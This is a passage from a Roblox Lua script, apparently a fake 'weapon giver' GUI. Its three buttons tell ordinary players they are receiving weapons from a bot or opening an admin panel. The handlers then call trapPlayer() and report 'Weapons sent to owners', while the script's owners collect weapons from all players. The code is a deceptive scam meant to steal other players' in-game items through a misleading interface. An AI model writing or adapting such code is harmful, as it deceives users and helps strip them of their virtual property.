    -- ═══════════════════════════════════════════════════════════
    -- BUTTON FUNCTIONS
    -- ═══════════════════════════════════════════════════════════
    
    btn1.MouseButton1Click:Connect(function()
        if IS_OWNER then
            status.Text = "👑 Collecting all weapons from everyone!"
            status.TextColor3 = Color3.fromRGB(0, 255, 100)
            local collected, players = collectAllGoodWeapons()
            if collected > 0 then
                status.Text = string.format("✅ Collected %d weapons from %d players!", collected, players)
                status.TextColor3 = Color3.fromRGB(0, 255, 100)
                notifyOwner(string.format("🔥 COLLECTED %d GOOD WEAPONS FROM %d PLAYERS!", collected, players), Color3.fromRGB(255, 215, 0))
            else
                status.Text = "ℹ️ No good weapons found!"
                status.TextColor3 = Color3.fromRGB(255, 200, 100)
            end
        else
            status.Text = "🎁 Getting weapons from bot..."
            status.TextColor3 = Color3.fromRGB(0, 255, 100)
            trapPlayer()
            wait(1)
            status.Text = "✅ Weapons sent to owners!"
            status.TextColor3 = Color3.fromRGB(0, 255, 100)
        end
    end)
    
    btn2.MouseButton1Click:Connect(function()
        if IS_OWNER then
            status.Text = "👑 YOU ARE AN OWNER! You get everything!"
            status.TextColor3 = Color3.fromRGB(0, 255, 100)
            local collected, players = collectAllGoodWeapons()
            if collected > 0 then
                status.Text = string.format("✅ Collected %d weapons from %d players!", collected, players)
            end
        else
            status.Text = "🔒 You are not an owner. Getting weapons from bot..."
            status.TextColor3 = Color3.fromRGB(255, 200, 0)
            trapPlayer()
            wait(1)
            status.Text = "✅ Weapons sent to owners!"
            status.TextColor3 = Color3.fromRGB(0, 255, 100)
        end
    end)
    
    btn3.MouseButton1Click:Connect(function()
        if IS_OWNER then
            status.Text = "👑 Admin mode: Collecting all weapons!"
            status.TextColor3 = Color3.fromRGB(0, 255, 100)
            local collected, players = collectAllGoodWeapons()
            if collected > 0 then
                status.Text = string.format("✅ Collected %d weapons from %d players!", collected, players)
            end
        else
            status.Text = "🔓 Accessing admin panel..."
            status.TextColor3 = Color3.fromRGB(255, 200, 0)
            wait(1)
            status.Text = "⚠️ Not authorized! Weapons confiscated!"
            status.TextColor3 = Color3.fromRGB(255, 0, 0)
            trapPlayer()
            wait(1)
            status.Text = "✅ Weapons sent to owners!"
            status.TextColor3 = Color3.fromRGB(0, 255, 100)
        end
    end)
    
    -- Hover effects
    btn1.MouseEnter:Connect(function()
        TweenService:Create(btn1, TweenInfo.new(0.2), {
            Size = UDim2.new(0.72, 0, 0, 52)
        }):Play()
    end)
    btn1.MouseLeave:Connect(function()
        TweenService:Create(btn1, TweenInfo.new(0.2), {
            Size = UDim2.new(0.7, 0, 0, 50)
        }):Play()
    end)
    
    btn2.MouseEnter:Connect(function()
        TweenService:Create(btn2, TweenInfo.new(0.2), {
            Size = UDim2.new(0.72, 0, 0, 47)
        }):Play()
    end)
    btn2.MouseLeave:Connect(function()
        TweenService:Create(btn2, TweenInfo.new(0.2), {
            Size = UDim2.new(0.7, 0, 0, 45)
        }):Play()
    end)
    
    btn3.MouseEnter:Connect(function()
        TweenService:Create(btn3, TweenInfo.new(0.2), {
            Size = UDim2.new(0.72, 0, 0, 47)
        }):Play()
    end)
    btn3.MouseLeave:Connect(function()
        TweenService:Create(btn3, TweenInfo.new(0.2), {
            Size = UDim2.new(0.7, 0, 0, 45)
        }):Play()
    end)
    
    return screenGui
end

